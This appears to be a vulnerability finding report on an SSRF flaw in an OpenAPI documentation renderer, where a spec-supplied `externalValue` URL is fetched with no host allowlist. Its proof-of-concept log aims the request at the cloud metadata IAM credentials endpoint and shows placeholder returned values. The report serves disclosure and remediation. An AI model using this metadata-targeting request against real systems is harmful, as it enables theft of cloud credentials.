# [H5] Ssrf Externalvalue Fetch No Allowlist

## Summary

`ExampleModel.getExternalValue()` at `src/services/models/Example.ts:41` calls bare `fetch(this.externalValueUrl)` — a direct browser `fetch` with no scheme check, no host allow-list, and no reuse of the `customFetch` channel configured in `loadAndBundleSpec`. The URL is spec-author-controlled via `examples[X].externalValue`. The response body is returned to the DOM renderer.

## Severity, Confidence, Vulnerability Type

- **Severity**: High
- **Confidence**: Confirmed (PoC executed)
- **Vulnerability Type**: SSRF / Read-Out SSRF
- **FP-Verdict**: TRUE-POSITIVE (confidence: HIGH)
- **Triage-Priority**: P1

## Impact

- **Blind SSRF** (always): request reaches target regardless of CORS policy. Side-channel: timing, error vs success.
- **Read-out SSRF** (when CORS permits or same-origin): full response body exposed in the rendered example panel.
- **Cloud metadata exfiltration**: cloud-hosted documentation portals rendering attacker specs may expose instance metadata.

## Affected Component

- **File**: `src/services/models/Example.ts:41`
- **Chamber**: chamber-02

## Source to Sink Flow

Primary site: `src/services/models/Example.ts:41`. See draft.md for the full trace.

## Vulnerable Code

- `src/services/models/Example.ts:5` — module-level cache `externalExamplesCache`
- `src/services/models/Example.ts:23-25` — URL construction from spec field
- `src/services/models/Example.ts:41` — bare `fetch()` call
- `[REDACTED].ts:20` — hook triggers fetch
- `src/components/PayloadSamples/Example.tsx:14-15` — routing to ExternalExample

## Proof of concept & Evidence

**PoC-Status**: executed

Evidence files under `evidence/`:
- `evidence/env-info.txt`
- `evidence/exploit.log`
- `evidence/impact.log`
- `evidence/poc.ts`

Decisive output from `evidence/exploit.log`:
```
[H5-PoC] Instantiating ExampleModel with attacker-controlled externalValue...
[H5-PoC] SSRF target: http://169.254.169.254/latest/meta-data/iam/security-credentials/
[H5-PoC] ExampleModel.externalValueUrl resolved to: http://169.254.169.254/latest/meta-data/iam/security-credentials/
[H5-PoC] Calling getExternalValue() — this triggers bare fetch()...
[H5-PoC] fetch() returned body: {"instance-id":"i-deadbeef","iam-role":"ssrf-victim-role"}
[H5-PoC] Total fetch() calls intercepted: 1
[H5-PoC] URLs dispatched to fetch(): ["http://169.254.169.254/latest/meta-data/iam/security-credentials/"]
[H5-PoC] SUCCESS: SSRF confirmed. fetch() dispatched to arbitrary internal URL.
[H5-PoC] In a real browser, this request reaches the metadata endpoint.
[H5-PoC] If CORS permits (or same-origin), the IAM credential body is rendered in the docs UI.
{"status":"confirmed","evidence":"bare fetch() dispatched to http://169.254.169.254/latest/meta-data/iam/security-credentials/ with no allowlist check; ExampleModel.externalValueUrl=http://169.254.169.254/latest/meta-data/iam/security-credentials/; response body rendered: {\"instance-id\":\"i-deadbeef\",\"iam-role\":\"ssrf-victim-role\"}","notes":"ExampleModel.getExternalValue() at src/services/models/Example.ts:41 calls fetch() directly; no scheme/host validation; URL derived verbatim from spec externalValue field."}

```

## Preconditions

- **Auth-Required**: no
- **Auth-Roles**: anonymous
- **Protocol**: http
- **Attack vector**: Remote (network); attacker must control or influence the OpenAPI spec rendered by Acme.

## Remediation

See draft.md for the recommended fix. Primary remediation site: `src/services/models/Example.ts:41`.

Confirm-Status: confirmed-live
Confirm-Timestamp: 2026-05-19T04:03:12Z
Confirm-Evidence: archon/findings/H5-ssrf-externalvalue-fetch-no-allowlist/confirm-evidence/
Confirm-Variant-Count: 1
Confirm-FpCheck: not-run
Confirm-Notes: bare fetch() dispatched to http://169.254.169.254/latest/meta-data/iam/security-credentials/ with no allowlist check; ExampleModel.externalValueUrl=http://169.254.169.254/latest/meta-data/iam/security-credentials/; response body rendered: {"instance-id":"i-deadbeef","iam-role":"ssrf-victim-role"} | ExampleModel.getExternalValue() at src/services/models/Example.ts:41 calls fetch() directly; no scheme/host validation; URL derived verbatim from spec externalValue field.
